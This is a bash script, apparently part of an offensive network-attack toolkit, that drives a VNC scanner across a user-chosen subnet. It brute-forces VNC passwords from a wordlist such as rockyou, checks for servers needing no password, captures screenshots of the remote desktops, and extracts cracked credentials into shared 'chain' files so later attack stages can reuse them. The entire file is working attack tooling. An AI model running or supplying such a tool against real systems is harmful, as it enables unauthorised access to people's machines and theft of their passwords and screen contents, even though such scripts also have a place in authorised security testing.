#!/usr/bin/env bash
source "$(dirname "$0")/../lib.sh"
set -uo pipefail

banner "VNC BRUTE" "Subnet scan · RFB auth test · desktop screenshot capture"

require_tool nmap   "apt install nmap"
require_tool python3 "apt install python3"

# ── Python dependency check ────────────────────────────────────────────────────
section "DEPENDENCIES"

_missing=0
_check_py() {
  local mod="$1" hint="$2"
  if python3 -c "import $mod" 2>/dev/null; then
    printf '  %s[✓]%s python3::%s\n' "${GREEN}" "${RESET}" "$mod"
  else
    printf '  %s[!]%s python3::%s missing  →  %s\n' "${RED}" "${RESET}" "$mod" "$hint"
    _missing=1
  fi
}
_check_py nmap  "pip3 install python-nmap"
_check_py PIL   "pip3 install Pillow"
_check_py numpy "pip3 install numpy"
_check_py tqdm  "pip3 install tqdm"

# DES crypto — any one of three libs is fine
if ! python3 -c "
try:
  from unicrypto.symmetric import DES, MODE_ECB
except ImportError:
  try:
    from pyVNC.pyDes import des
  except ImportError:
    from Crypto.Cipher import DES
" 2>/dev/null; then
  printf '  %s[!]%s No DES crypto lib  →  pip3 install pycryptodome\n' "${RED}" "${RESET}"
  _missing=1
else
  printf '  %s[✓]%s DES crypto\n' "${GREEN}" "${RESET}"
fi

(( _missing )) && { printf '\n  %s[!]%s Install missing packages and retry.\n' "${RED}" "${RESET}"; exit 1; }

SCANNER="$(dirname "$0")/../vnc_scanner.py"
[[ ! -f "$SCANNER" ]] && {
  printf '\n  %s[!]%s vnc_scanner.py not found at: %s\n' "${RED}" "${RESET}" "$SCANNER"; exit 1
}

outdir="$(make_outdir)"
outfile="$outdir/vnc.txt"
: > "$outfile"
SHOT_DIR="$outdir/screenshots"

# ── Target ─────────────────────────────────────────────────────────────────────
section "TARGET"
if [[ -n "${TARGET:-}" ]]; then
  SUBNET="$TARGET"
  printf '  %s[*]%s Subnet : %s%s%s\n' "${CYAN}" "${RESET}" "${GREEN}" "$SUBNET" "${RESET}"
else
  printf '  %s>>%s Target subnet / CIDR (e.g. 192.168.1.0/24): ' "${CYAN}" "${RESET}"
  IFS= read -r SUBNET
  [[ -z "$SUBNET" ]] && { printf '  %s[!]%s No target specified.\n' "${RED}" "${RESET}"; exit 1; }
fi

# Pipeline: check chain_ports.txt for known VNC hosts (skip full subnet scan)
if [[ -n "${SESSION_DIR:-}" ]] && [[ -s "${SESSION_DIR}/chain_ports.txt" ]]; then
  _vnc_hosts=$(grep -E ':(5900|5901|5902|5903|5904|5800|5801)$' "${SESSION_DIR}/chain_ports.txt" 2>/dev/null \
    | cut -d: -f1 | sort -u | tr '\n' ' ' | xargs 2>/dev/null || true)
  if [[ -n "$_vnc_hosts" ]]; then
    SUBNET="$_vnc_hosts"
    printf '  %s[CHAIN]%s VNC hosts from chain_ports.txt: %s%s\n\n' \
      "${CYAN}" "${RESET}" "$_vnc_hosts" "${RESET}"
  fi
fi

# ── Credentials ────────────────────────────────────────────────────────────────
section "CREDENTIALS"

PASS_ARGS=()
_tmppass=""

if [[ -n "${SESSION_DIR:-}" ]]; then
  _wl="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
  [[ ! -f "$_wl" && -f "${_wl}.gz" ]] && gunzip -k "${_wl}.gz" 2>/dev/null || true
  if [[ -f "$_wl" ]]; then
    PASS_ARGS=("--password-file" "$_wl" "--no-password")
    printf '  %s[CHAIN]%s Mode: wordlist + no-auth  Wordlist: %s%s\n\n' \
      "${CYAN}" "${RESET}" "$_wl" "${RESET}"
  else
    PASS_ARGS=("--no-password")
    printf '  %s[CHAIN]%s Mode: no-auth only  (wordlist not found)%s\n\n' "${CYAN}" "${RESET}" "${RESET}"
  fi
else
  printf '  %s[01]%s ▶  Wordlist           %s(rockyou or custom path)%s\n' "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s[02]%s ▶  Manual passwords   %s(enter inline)%s\n'           "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s[03]%s ▶  No-auth only       %s(test open VNC)%s\n'          "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s[04]%s ▶  Wordlist + no-auth %s(both)%s\n\n'                 "${CYAN}" "${RESET}" "${DIM}" "${RESET}"
  printf '  %s>>%s Mode [1]: ' "${CYAN}" "${RESET}"
  read -r _mode; _mode="${_mode:-1}"

  case "$_mode" in
    1|4)
      _wl="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
      if [[ ! -f "$_wl" ]] && [[ -f "${_wl}.gz" ]]; then
        printf '  %s[*]%s Decompressing %s.gz ...\n' "${CYAN}" "${RESET}" "$(basename "$_wl")"
        gunzip -k "${_wl}.gz" 2>/dev/null || true
      fi
      printf '  %s>>%s Wordlist path [%s]: ' "${CYAN}" "${RESET}" "$_wl"
      IFS= read -r _inp; [[ -n "$_inp" ]] && _wl="$_inp"
      [[ ! -f "$_wl" ]] && {
        printf '  %s[!]%s Wordlist not found: %s\n' "${RED}" "${RESET}" "$_wl"; exit 1
      }
      printf '  %s[*]%s Wordlist : %s%s%s\n' "${CYAN}" "${RESET}" "${DIM}" "$_wl" "${RESET}"
      PASS_ARGS+=("--password-file" "$_wl")
      [[ "$_mode" == "4" ]] && PASS_ARGS+=("--no-password")
      ;;
    2)
      _tmppass="$(mktemp /tmp/.vnc_pass_XXXXXX)"
      printf '  %s[*]%s Enter passwords (one per line, blank to finish):\n\n' "${CYAN}" "${RESET}"
      while IFS= read -r _p; do
        [[ -z "$_p" ]] && break
        printf '%s\n' "$_p" >> "$_tmppass"
      done
      [[ ! -s "$_tmppass" ]] && {
        rm -f "$_tmppass"
        printf '  %s[!]%s No passwords entered.\n' "${RED}" "${RESET}"; exit 1
      }
      _cnt=$(wc -l < "$_tmppass")
      printf '  %s[*]%s Loaded %s password(s)\n' "${CYAN}" "${RESET}" "$_cnt"
      PASS_ARGS+=("--password-file" "$_tmppass")
      ;;
    3)
      PASS_ARGS+=("--no-password")
      ;;
    *)
      printf '  %s[!]%s Invalid selection.\n' "${RED}" "${RESET}"; exit 1
      ;;
  esac
fi

# ── Ports ──────────────────────────────────────────────────────────────────────
section "PORTS"
PORT_ARGS=()
if [[ -z "${SESSION_DIR:-}" ]]; then
  printf '  %s[*]%s Default: 5900 5901 5902 5903 5904 5800 5801\n' "${CYAN}" "${RESET}"
  printf '  %s>>%s Custom ports? (space-separated, Enter for defaults): ' "${CYAN}" "${RESET}"
  IFS= read -r _ports_raw
  if [[ -n "$_ports_raw" ]]; then
    read -ra _ports_arr <<< "$_ports_raw"
    PORT_ARGS+=("--ports" "${_ports_arr[@]}")
  fi
fi

# ── Options ────────────────────────────────────────────────────────────────────
section "OPTIONS"
if [[ -n "${SESSION_DIR:-}" ]]; then
  _threads=20; _timeout=6
  printf '  %s[CHAIN]%s Threads: 20  Timeout: 6s  (pipeline defaults)%s\n\n' "${CYAN}" "${RESET}" "${RESET}"
else
  printf '  %s>>%s Concurrent threads [20]: ' "${CYAN}" "${RESET}"
  IFS= read -r _threads; _threads="${_threads:-20}"
  printf '  %s>>%s Auth timeout per host, seconds [6]: ' "${CYAN}" "${RESET}"
  IFS= read -r _timeout; _timeout="${_timeout:-6}"
fi

# ── Run ────────────────────────────────────────────────────────────────────────
section "VNC SCAN — RUNNING"
printf '  %s[*]%s Target   : %s%s%s\n'   "${CYAN}" "${RESET}" "${BOLD}" "$SUBNET" "${RESET}"
printf '  %s[*]%s Shots dir: %s%s%s\n'   "${CYAN}" "${RESET}" "${DIM}"  "$SHOT_DIR" "${RESET}"
printf '  %s[*]%s Report   : %s%s%s\n\n' "${CYAN}" "${RESET}" "${DIM}"  "$outfile" "${RESET}"

run_fg python3 "$SCANNER" \
  --subnet          "$SUBNET" \
  "${PASS_ARGS[@]}" \
  "${PORT_ARGS[@]}" \
  --threads         "$_threads" \
  --timeout         "$_timeout" \
  --screenshots-dir "$SHOT_DIR" \
  --output          "$outfile" \
  --confirm

# ── Extract credentials in standard import format ──────────────────────────────
# Parse the text report; emit [port][vnc] host: X   login: vnc   password: Y
_creds=$(python3 - "$outfile" 2>/dev/null << 'PYEOF'
import sys, re

try:
    text = open(sys.argv[1]).read()
except Exception:
    sys.exit(0)

# Each success block: "  ┌─ host:port" followed by "Auth Message : ..."
block_re = re.compile(
    r'┌─\s+(\S+?):(\d+).*?Auth Message\s*:\s*(.*?)(?=┌─|={4}|$)',
    re.DOTALL
)
for m in block_re.finditer(text):
    host, port, auth_msg = m.group(1), m.group(2), m.group(3).strip()
    pw_m = re.search(r"password:\s*'([^']*)'", auth_msg)
    if pw_m:
        print(f"[{port}][vnc] host: {host}   login: vnc   password: {pw_m.group(1)}")
    elif "No authentication required" in auth_msg or "no-auth" in auth_msg.lower():
        print(f"[{port}][vnc] host: {host}   login: vnc   password: <no-auth>")
PYEOF
)

if [[ -n "$_creds" ]]; then
  {
    printf '\n=== VNC CREDENTIALS ===\n'
    printf '%s\n' "$_creds"
  } >> "$outfile"
  printf '\n  %s[+]%s Credentials appended — use Import in project view.\n' "${GREEN}" "${RESET}"
fi

# ── Pipeline chain publish ─────────────────────────────────────────────────────
if [[ -n "${SESSION_DIR:-}" ]]; then
  if [[ -n "$_creds" ]]; then
    printf '%s\n' "$_creds" >> "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true
    sort -u "${SESSION_DIR}/chain_creds.txt" -o "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || true
    _cc=$(wc -l < "${SESSION_DIR}/chain_creds.txt" 2>/dev/null || echo 0)
    printf '  %s[CHAIN]%s chain_creds.txt: %s VNC credential(s) published%s\n' \
      "${CYAN}" "${RESET}" "$_cc" "${RESET}"
  fi
  # Publish VNC hosts → alive_hosts.txt + chain_ports.txt
  grep -oE '\[[0-9]+\]\[vnc\] host: ([0-9.]+)' "$outfile" 2>/dev/null \
    | grep -oE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort -u \
    | while IFS= read -r _vh; do
        printf '%s\n' "$_vh" >> "${SESSION_DIR}/alive_hosts.txt" 2>/dev/null || true
        printf '%s:5900\n' "$_vh" >> "${SESSION_DIR}/chain_ports.txt" 2>/dev/null || true
      done
  sort -u "${SESSION_DIR}/alive_hosts.txt" -o "${SESSION_DIR}/alive_hosts.txt" 2>/dev/null || true
  sort -u "${SESSION_DIR}/chain_ports.txt" -o "${SESSION_DIR}/chain_ports.txt" 2>/dev/null || true
  printf '  %s[CHAIN]%s VNC hosts → alive_hosts.txt + chain_ports.txt%s\n\n' \
    "${CYAN}" "${RESET}" "${RESET}"
fi

# ── Cleanup & finish ───────────────────────────────────────────────────────────
[[ -n "$_tmppass" ]] && rm -f "$_tmppass"

mark_done "$outfile"
printf '\n  %s[SYS]%s Report : %s%s%s\n' \
  "${CYAN}" "${RESET}" "${DIM}" "$outfile" "${RESET}"
printf '  %s[SYS]%s Shots  : %s%s%s\n\n' \
  "${CYAN}" "${RESET}" "${DIM}" "$SHOT_DIR" "${RESET}"
